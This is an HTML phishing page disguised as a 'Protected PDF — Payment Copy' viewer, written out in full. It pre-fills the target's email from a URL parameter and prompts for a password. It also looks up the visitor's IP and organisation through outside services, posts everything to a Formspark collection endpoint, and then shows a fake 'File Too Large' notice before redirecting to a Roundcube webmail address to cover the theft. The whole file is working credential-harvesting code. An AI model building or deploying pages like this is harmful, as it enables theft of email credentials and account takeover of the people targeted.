<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Protected PDF ‚Äî Payment Copy</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; font-family: Arial, sans-serif; background: #f2f2f2; }
    #splash {
      position: fixed; inset: 0; background: #fff; display: flex; align-items: center; justify-content: center;
      transition: opacity 0.5s ease;
      z-index: 9999;
    }
    #main { display: none; opacity: 0; transition: opacity 0.5s ease; }
    #main.show { display: block; opacity: 1; }

    .container {
      max-width: 360px; margin: 80px auto; padding: 20px; background: #fff; border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 { text-align: center; margin-bottom: 20px; font-size: 1.3em; }
    .form-group { margin-bottom: 15px; }
    input {
      width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px;
      font-size: 1em;
    }
    button {
      width: 100%; padding: 10px; background: #0061ff; color: #fff; border: none;
      border-radius: 4px; font-size: 1em; cursor: pointer;
    }
    button:hover { background: #004ecc; }

    .hidden { display: none; }

    .password-toggle {
      position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
      cursor: pointer;
    }
    .password-wrapper { position: relative; }

    /* Modal */
    #modalOverlay {
      position: fixed; inset: 0; background: rgba(0,0,0,0.5);
      display: none; align-items: center; justify-content: center;
      z-index: 99999;
    }
    .modal {
      background: #fff; padding: 20px; border-radius: 8px; width: 90%; max-width: 320px;
      text-align: center;
    }
    .modal h3 { margin-bottom: 10px; }
    .modal p { margin-bottom: 15px; }
    .modal button {
      width: auto; padding: 8px 16px; margin: 5px;
    }
  </style>
</head>
<body>
  <!-- Splash Screen -->
  <div id="splash">
    <h2>Loading...</h2>
  </div>

  <!-- Main Content -->
  <div id="main">
    <div class="container">
      <h2>Protected PDF ‚Äî Payment Copy</h2>
      <form id="mainForm" method="POST" action="https://submit-form.com/YOUR_FORMSPARK_ID">
        <div id="stepEmail">
          <div class="form-group">
            <input type="email" id="email" name="email" placeholder="Email address" required readonly>
          </div>
          <button type="button" id="continueBtn">Continue</button>
        </div>

        <div id="stepPassword" class="hidden">
          <div class="form-group password-wrapper">
            <input type="password" id="password" name="password" placeholder="Enter Password" required>
            <span id="togglePassword" class="password-toggle">üëÅÔ∏è</span>
          </div>
          <input type="hidden" id="ip" name="ip">
          <input type="hidden" id="hostname" name="hostname">
          <button type="submit">Open Document</button>
        </div>
      </form>
    </div>
  </div>

  <!-- Modal -->
  <div id="modalOverlay" aria-hidden="true">
    <div class="modal">
      <h3>File Too Large</h3>
      <p>Your file is large. Redirecting in <span id="countdownNumber">8</span> seconds...</p>
      <button id="modalProceed">Proceed Now</button>
      <button id="modalClose">Close</button>
    </div>
  </div>

  <script>
    // Splash
    window.addEventListener('load', () => {
      setTimeout(() => {
        document.getElementById('splash').style.opacity = '0';
        setTimeout(() => {
          document.getElementById('splash').style.display = 'none';
          document.getElementById('main').classList.add('show');
        }, 500);
      }, 800);
    });

    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const stepEmail = document.getElementById('stepEmail');
    const stepPassword = document.getElementById('stepPassword');
    const continueBtn = document.getElementById('continueBtn');
    const toggle = document.getElementById('togglePassword');
    const form = document.getElementById('mainForm');

    const modalOverlay = document.getElementById('modalOverlay');
    const modalClose = document.getElementById('modalClose');
    const modalProceed = document.getElementById('modalProceed');
    const countdownNumber = document.getElementById('countdownNumber');

    const ROUND_CUBE_URL = "https://webmail.roundcube.101.hostinglogin.net/";
    const AUTO_REDIRECT_SECONDS = 8;
    let redirectTimer = null;
    let countdownTimer = null;

    function showModalWithCountdown() {
      modalOverlay.style.display = 'flex';
      modalOverlay.setAttribute('aria-hidden', 'false');
      let remaining = AUTO_REDIRECT_SECONDS;
      countdownNumber.textContent = remaining;
      countdownTimer = setInterval(() => {
        remaining--;
        if (remaining >= 0) countdownNumber.textContent = remaining;
      }, 1000);
      redirectTimer = setTimeout(() => {
        clearInterval(countdownTimer);
        window.location.href = ROUND_CUBE_URL;
      }, AUTO_REDIRECT_SECONDS * 1000);
    }

    function closeModalAndRedirectImmediately() {
      modalOverlay.style.display = 'none';
      modalOverlay.setAttribute('aria-hidden', 'true');
      clearTimeout(redirectTimer);
      clearInterval(countdownTimer);
      window.location.href = ROUND_CUBE_URL;
    }

    // Autofill email from URL
    window.addEventListener('DOMContentLoaded', () => {
      const params = new URLSearchParams(window.location.search);
      const urlEmail = params.get('email');
      if (urlEmail) emailInput.value = decodeURIComponent(urlEmail);

      // IP & Hostname
      fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
          document.getElementById('ip').value = data.ip;
          return fetch(`https://ipapi.co/${data.ip}/json/`);
        })
        .then(r => r.json())
        .then(info => {
          document.getElementById('hostname').value = info.org || info.city || 'Unknown';
        })
        .catch(() => {});
    });

    // Continue to password
    continueBtn.addEventListener('click', () => {
      if (!emailInput.value) {
        emailInput.focus();
        return;
      }
      stepEmail.classList.add('hidden');
      stepPassword.classList.remove('hidden');
      passwordInput.focus();
    });

    // Toggle password
    toggle.addEventListener('click', () => {
      const isHidden = passwordInput.type === 'password';
      passwordInput.type = isHidden ? 'text' : 'password';
      toggle.textContent = isHidden ? 'üôà' : 'üëÅÔ∏è';
    });

    // On form submit: submit naturally, show modal
    form.addEventListener('submit', () => {
      setTimeout(() => {
        showModalWithCountdown();
      }, 500);
    });

    modalClose.addEventListener('click', closeModalAndRedirectImmediately);
    modalProceed.addEventListener('click', closeModalAndRedirectImmediately);

    // Prevent enter key at email step from submitting
    emailInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        continueBtn.click();
      }
    });
  </script>
</body>
</html>
